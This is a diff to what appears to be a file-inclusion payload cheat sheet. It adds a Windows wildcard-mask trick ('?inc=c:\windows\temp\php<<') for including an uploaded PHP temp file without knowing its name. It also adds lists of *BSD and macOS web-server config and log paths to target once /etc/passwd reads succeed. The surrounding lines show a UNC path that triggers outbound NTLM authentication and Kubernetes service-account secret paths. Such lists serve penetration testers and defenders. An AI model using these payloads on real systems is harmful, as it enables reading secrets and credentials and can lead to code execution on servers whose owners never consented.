@@ -84,6 +84,11 @@ url:http://127.0.0.1:8080
 
 # Windows UNC share (triggers outbound NTLM auth as a side effect)
 \\localhost\c$\windows\win.ini
+
+# Windows FindFirstFile wildcard masks — match an unknown filename without
+# brute-forcing it. `<<` acts as `*`, `>` as `?`. Lets you include an
+# uploaded temp file (C:\Windows\Temp\php[A-F0-9]{4}.tmp) by mask:
+?inc=c:\windows\temp\php<<
 ```
 
 ## Linux target files (beyond /etc/passwd, /etc/shadow, /proc/self/environ)
@@ -123,6 +128,31 @@ Containerized / Kubernetes service-account secrets:
 /run/secrets/kubernetes.io/serviceaccount/namespace
 /run/secrets/kubernetes.io/serviceaccount/certificate
 /var/run/secrets/kubernetes.io/serviceaccount
+```
+
+## *BSD / macOS target files (Apache + log paths differ from Linux)
+
+If `/etc/passwd` reads but the Linux log/config paths 404, the host may be
+FreeBSD/OpenBSD/NetBSD or macOS — try these instead:
+
+```
+# *BSD httpd config + logs
+/usr/pkg/etc/httpd/httpd.conf
+/usr/local/etc/apache22/httpd.conf
+/usr/local/etc/apache2/httpd.conf
+/var/www/conf/httpd.conf
+/var/www/logs/error_log          /var/www/logs/access_log
+/var/apache2/logs/error_log      /var/apache2/logs/access_log
+/var/log/httpd-error.log         /var/log/httpd-access.log
+/var/log/httpd/error_log         /var/log/httpd/access_log
+
+# macOS
+/etc/apache2/httpd.conf
+/Library/WebServer/Documents/index.html
+/private/var/log/appstore.log
+/var/log/apache2/error_log        /var/log/apache2/access_log
+/usr/local/nginx/conf/nginx.conf
+/var/log/nginx/error_log          /var/log/nginx/access_log
 ```
 
 ## Windows target files (beyond win.ini / web.config)
